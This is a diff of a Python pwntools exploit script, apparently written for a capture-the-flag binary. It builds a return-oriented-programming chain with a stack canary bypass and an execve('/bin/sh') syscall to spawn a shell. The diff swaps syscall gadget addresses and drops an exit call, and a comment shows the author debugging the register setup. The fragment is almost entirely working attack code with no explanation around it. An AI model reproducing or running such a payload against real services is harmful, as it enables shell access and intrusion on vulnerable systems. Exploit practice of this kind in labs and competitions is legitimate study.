@@ -66,6 +66,7 @@ input()
 
 0x000000000007bfc5 : and esi, 0x80 ; syscall // another syscall possibility
 0x000000000007ce94 : mov eax, eax ; syscall
+0x000000000005e493 : int 0x80
 """
 
 codes = """
@@ -92,13 +93,13 @@ ret = main - 0x8ad0 + 0x801a
 pop_rdi = main - 0x8ad0 + 0x917f
 pop_rax = main - 0x8ad0 + 0x057187
 syscall = main - 0x8ad0 + 0x8f34
-# syscall = main - 0x8ad0 + 0x07ce94
+# syscall = main - 0x8ad0 + 0x05e493
+
+# maybe it is just the rdx/rsi not set correctly
 payload = b'/bin/sh\0\0' + b'A' * (0x28 - len("/bin/sh\0\0")) + p64( canary) + p64(dummy) + \
                                                                 p64( pop_rdi) + p64(rbp - 0x40) + \
                                                                 p64( pop_rsi) + p64(rbp - 0x40 + 7) + \
-                                                                p64( pop_rax) + p64(59) + p64(syscall) + \
-                                                                p64( ret) + \
-                                                                p64( pop_rax) + p64(60) + p64(syscall)
+                                                                p64( pop_rax) + p64(59) + p64(syscall)
 garbo = r.recvuntil('message: '.encode())
 r.send( payload)
 # given = r.recvline()
